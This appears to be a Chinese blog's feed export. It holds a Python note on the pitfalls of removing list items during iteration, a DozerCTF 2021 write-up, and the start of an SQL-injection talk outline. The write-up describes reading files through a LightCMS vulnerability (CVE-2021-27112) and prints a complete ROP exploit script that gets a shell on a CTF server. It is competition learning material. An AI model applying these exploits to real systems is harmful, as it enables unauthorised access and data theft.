&#39;C&#39;&#125;All Done!</code></pre><hr><h2 id="任务概况"><a href="#任务概况" class="headerlink" title="任务概况"></a>任务概况</h2><p>这个脚本是为了完成某任务，将所有用户存储在一个list里，即</p><pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>对于此任务，中间过程直接省略，有概率(不可定因素)会失败，所以有补错措施。</p><p>假使本任务补错措施完整，不会出现死循环情况。</p><p>对于本测试，模拟出错记录次数time为2次。</p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""xxx"""</span></code></pre><p>可见对于list中(下称用户集)的每个dict(下称用户)赋给user，然后进行处理任务(下称任务)，由于<code>while data</code> 必须所有用户全部完成任务才会结束。</p><h4 id="原思想："><a href="#原思想：" class="headerlink" title="原思想："></a>原思想：</h4><p>对于每个用户先全部做一遍任务，然后出错的用户由补错措施补错</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> xxxx<span class="token punctuation">:</span>  <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span></code></pre><p>如上，模拟完成任务就从用户集中移出此用户，然后如果有任务出错，用户还在用户集里，输出一行<code>new cycle!==========</code>，继续执行任务。</p><p>然而最终输出却是如下</p><pre class="language-none"><code class="language-none">test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!</code></pre><p>出现了4次<code>new cycle!==========</code></p><h4 id="实际情况："><a href="#实际情况：" class="headerlink" title="实际情况："></a>实际情况：</h4><p>通过debug，可以看到</p><p>第一次：</p><img src="/article/pythondict/image-20210608170630964.png" class="" title="image-20210608170630964" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170648260.png" class="" title="image-20210608170648260" loading="lazy"><p>这里并没有什么异常，我们过四次看看</p><p>第四次：</p><img src="/article/pythondict/image-20210608170759998.png" class="" title="image-20210608170759998" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170807924.png" class="" title="image-20210608170807924" loading="lazy"><p>然后，它竟然跳出了for循环</p><img src="/article/pythondict/image-20210608171051661.png" class="" title="image-20210608171051661" loading="lazy"><p>也就是说<code>for user in data</code>已经走完一遍了</p><p>后面几次同理</p><h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>本人才疏学浅，略有拙见，如有错误还请大佬指正！</p><p>经过考虑，觉得原因如下</p><p>python的变量定义并没有那么严格，凭感觉说，像是一种容器。</p><p><code>for user in data</code>，其实就是user代表元素，而它内部有个隐形指针帮助user取元素，它删掉了元素后，迭代器未同步更新，迭代器最后到达list末尾不会报错，从而异常，我们做个小测试</p><pre class="language-python" data-language="python"><code class="language-python">dictlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> dictlist<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    dictlist<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>猜猜结果怎么样？</p><details>  <summary>结果如下</summary>{1: 1}{3: 3}{5: 5}{7: 7}</details><p>可见，只输出了单数位</p><p><code>for i in datalist</code>测试<code>datalist</code>里的值</p><p>第一次，即为 <code>datalist[0]</code>（这里不规范地用数组来表示，比较直观）</p><p>有值为{1: 1}，任务进行</p><p>结束后<code>dictlist.remove(i)</code></p><p>此时<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;3: 3&#125;, &#123;4: 4&#125;, &#123;5: 5&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p>第二次为<code>datalist[1]-&gt;&#123;3: 3&#125;</code></p><p>则可以认定，对于dict的remove是即时完成，而i是作为<code>in data</code>的指代，其内部的隐形指针是<code>for(int i=0;i&lt;data.length;i++)</code>的等价代换。(此处的表达并不规范，仅作示意参考)</p><p>当第四次时，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p><code>datalist[3]-&gt;&#123;7: 7&#125;</code>，remove it.</p><p>第五次，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;8: 8&#125;]</code></p><p><code>datalist[4]-&gt;NULL</code>跳出了循环</p><img src="/article/pythondict/image-20210608184852589.png" class="" title="image-20210608184852589" loading="lazy"><h5 id="问题缘由"><a href="#问题缘由" class="headerlink" title="问题缘由"></a>问题缘由</h5><p>写了个小脚本，准备按用户顺序处理任务，结果发现并没有按顺序执行，然后输出cycle后，发现按单数执行了第一遍，进一步深究。发现了这个情况。</p><hr><h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>那如果我直接pop出dict呢？</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>  user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="原思想：-1"><a href="#原思想：-1" class="headerlink" title="原思想："></a>原思想：</h4><p>既然for会有越界问题(似乎Python并不觉得这是个问题hhh)，那么如果换种方式呢。</p><p>每次直接pop出一个用户，然后执行任务，如果出错就把这个用户加回用户集</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span> </code></pre><p>这样一来，确实没啥问题</p><h4 id="实际情况：-1"><a href="#实际情况：-1" class="headerlink" title="实际情况："></a>实际情况：</h4><p>对于本测试，不需要考虑其他因素，而对于撸的那个脚本，一般是不会出错，如果出错应该是一段时间内出错，即无法立刻解决，需要等待（例如这个用户今天不需要执行这个任务，补救达到上限才会执行其他用户任务，会大大拖延脚本的运行速度），这时候如test1先执行其他用户任务即可。</p><p>但在实际脚本中，由于补错措施，程序不写好补错上限就会陷入死循环。</p><h4 id="原因：-1"><a href="#原因：-1" class="headerlink" title="原因："></a>原因：</h4><p>问题在于，pop会弹出用户集最后一个用户，而一旦出现错误，补错措施是将其append回用户集，即还是最后一个用户，这样就会造成死循环</p><p>这里不能用<code>data[&#39;xxx&#39;]=xxx</code>，因为实际dict有很多键值对</p><p>没啥好的根本解决方法，咱不是搞算法和开发的，没有深究这里面的方法，如有方法请师傅们指教。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后脚本还是test1的方式没有变了，既然Python迭代器没有对其做啥表示，咱也就这样用着就好啦</p><p>这是菜鸡摸鱼撸撸小脚本时候遇到的小情况，也算是一个学习记录吧，还没有系统性地学习Python，可能学到了就会有方法可以解决了吧…</p><hr><h2 id="2021-9-15更新"><a href="#2021-9-15更新" class="headerlink" title="2021.9.15更新"></a>2021.9.15更新</h2><p>和Python老师讨论了一下，<code>for i in data</code>的i其实是元素，用<code>type(i)</code>可以得知，能解释的就是还有隐形指针帮助i取元素，而这个隐形指针对i元素在data的表示有着绝对影响，所以在remove后迭代器未及时更新，导致最后到达了list末尾，迭代器正常工作，迭代器退出，程序结束，未报异常，但没有按照我们想让它执行的样子执行，这就是写代码的逻辑和实际运行逻辑的差异吧…</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录下撸脚本的时候处理数据用到dict时的有趣发现&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Dozerctf2021</title>
    <link href="https://err0r.top/article/dozerctf2021/"/>
    <id>https://err0r.top/article/dozerctf2021/</id>
    <published>2021-05-30T14:08:38.000Z</published>
    <updated>2021-05-30T15:20:45.398Z</updated>
    
    <content type="html"><![CDATA[<p>队伍名称：戈戈哥哥不鸽鸽</p><a id="more"></a><p>大师傅们都去打xctf了，几个比赛重时间了，春秋，美团，das。</p><p>在几个比赛中疯狂衔接2333</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="简单域渗透Ⅱ-1"><a href="#简单域渗透Ⅱ-1" class="headerlink" title="简单域渗透Ⅱ-1"></a>简单域渗透Ⅱ-1</h3><p>拿到题Lightcms，直接打。目前网上两个洞，一个v跨站脚本漏洞，一个后台RCE漏洞<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27112">CVE-2021-27112</a></p><p>dozer/dozer123登陆后台</p><img src="/article/dozerctf2021/image-20210530221322010.png" class="" title="image-20210530221322010" loading="lazy"><p>在<code>内容管理-&gt;文章-&gt;新建文章内容</code>处上传文件，抓包得到<code>/admin/neditor/serve/uploadimage</code>路由，然后在<code>/admin/neditor/serve/catchImage</code>路由读取文件，网上有很多RCE文章，不多阐述。<code>file_get_contents</code>直接用file协议读取根目录flag，后来flag被改名了，这里算是前期的做法了。</p><img src="/article/dozerctf2021/image-20210530221927944.png" class="" title="image-20210530221927944" loading="lazy"><img src="/article/dozerctf2021/image-20210530221918897.png" class="" title="image-20210530221918897" loading="lazy"><p>后面即使拿到了shell也没有进一步突破，扫ip还扫错了</p><img src="/article/dozerctf2021/image-20210530230130511.png" class="" title="image-20210530230130511" loading="lazy"><hr><h3 id="未完成的网站"><a href="#未完成的网站" class="headerlink" title="未完成的网站"></a>未完成的网站</h3><p>猜测点</p><p><code>./people/&#123;&#125;</code>和<code>./download?url=&#123;&#125;</code></p><p>试了下发现过滤了<code>[]</code></p><p>然后疯狂被域渗透折磨</p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5.30, 2021"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># p = process('./pwn')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'1.14.160.21'</span><span class="token punctuation">,</span><span class="token number">20001</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000401281</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401313</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000401311</span>bin_addr <span class="token operator">=</span> <span class="token number">0x000000000401199</span>sh_addr <span class="token operator">=</span> <span class="token number">0x0000000004011F9</span>sys_addr <span class="token operator">=</span> <span class="token number">0x000000000401176</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xB16BAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xBADF00D</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xFEE1DEAD</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>cat /flag</code>即可</p><img src="/article/dozerctf2021/image-20210530225342181.png" class="" title="image-20210530225342181" loading="lazy"><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><img src="/article/dozerctf2021/image-20210530222649894.png" class="" title="image-20210530222649894" loading="lazy"><p>手比较快</p><hr><h3 id="做个问卷吧"><a href="#做个问卷吧" class="headerlink" title="做个问卷吧"></a>做个问卷吧</h3><p>非常简单</p><hr><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><p>听说国赛有一个running_pixel?</p><p>那就类比一下，发现几张图片类似，看一下md5，发现一共只有6种md5。猜测是二进制，提出来前16章，二进制为</p><p><code>01000100</code>==<code>d</code></p><p><code>01101111</code>==<code>o</code></p><p>很明显思路正确，写脚本就行了</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5月 30, 2021"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_file_md5</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#创建md5对象</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fobj<span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment">#更新md5对象</span>    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#返回md5对象</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'5baa9d8a0912ddfbd29ac3786ef859f8'</span><span class="token punctuation">,</span><span class="token string">'d63f8a4a7a1d6c8b8f04e7d73797edf8'</span><span class="token punctuation">,</span><span class="token string">'6002507730ab969502579b66e9fda4b9'</span><span class="token punctuation">]</span>    list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'86f2fd64a8d1f6bfa0728be9e97a4a72'</span><span class="token punctuation">,</span><span class="token string">'000b14c847091094ae2777614f16f4c6'</span><span class="token punctuation">,</span><span class="token string">'4d8a4db35c3a27b36865750319f7cdfd'</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        time <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> list0<span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"0"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"1"</span>            time <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> time<span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">" "</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">".png"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> pic_file<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pic <span class="token operator">=</span> get_file_md5<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pic_file<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> pic    result <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> item<span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="/article/dozerctf2021/image-20210530223305341.png" class="" title="image-20210530223305341" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;p&gt;队伍名称：戈戈哥哥不鸽鸽&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入分享</title>
    <link href="https://err0r.top/article/sqlinjection/"/>
    <id>https://err0r.top/article/sqlinjection/</id>
    <published>2021-05-26T05:43:04.000Z</published>
    <updated>2021-06-06T13:32:52.896Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>小交流会的提纲，记录下，没有逻辑可言</p><p>今年本人参加的CTF中记录的sql题目，由于可能有多种解，这里列出本人解法仅供参考</p><table><thead><tr><th>比赛-题目名称</th><th>注入类型</th><th>详细情况</th></tr></thead><tbody><tr><td>MTCTF-sql</td><td>盲注</td><td>布尔型，同表查询</td></tr><tr><td>国赛CISCN-easy_sql</td><td>盲注，报错</td><td>sqlmap一把梭，布尔型/延时注入/报错注入，最后无列名注入</td></tr><tr><td>红帽杯-WebsiteManger</td><td>盲注</td><td>布尔型(异或)/延时注入</td></tr><tr><td>红明谷-happysql</td><td>盲注</td><td>布尔型(正则)，无列名注入</td></tr><tr><td>DASCTF三月赛-bestDB</td><td>联合注入</td><td>load_file()</td></tr><tr><td>V&amp;NCTF-realezjvav</td><td>盲注</td><td>延时注入(笛卡尔积)</td></tr><tr><td>HGAME-200OK!</td><td>联合注入</td><td>基础SQL注入</td></tr><tr><td>HGAME-Liki-Jail</td><td>盲注</td><td>延时注入</td></tr><tr><td>春秋杯新春欢乐赛-按F注入</td><td>联合注入</td><td>Pgsql，延时注入(也许)/信息外带/数据库外联</td></tr></tbody></table><p>打个广告，各比赛的WP，有需要的师傅可以看看</p><p><a href="https://err0r.top/article/cqb2021/">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><p><a href="https://err0r.top/article/VN2021ctf/">V&amp;N2021公开赛</a></p><p><a href="https://err0r.top/article/mardasctf/">SQL无列名注入</a></p><p><a href="https://err0r.top/article/redhat2021/">红帽杯2021</a></p><p><a href="https://err0r.top/article/ciscn2021/">2021CISCN-WP</a></p><p>统计了一下今年的SQL注入题目，可能不全，从上表能看出大部分都是盲注，盲注的重要性可想而知。</p><hr><h2 id="常用函数"><a href="#常用函数" class="headerlink" 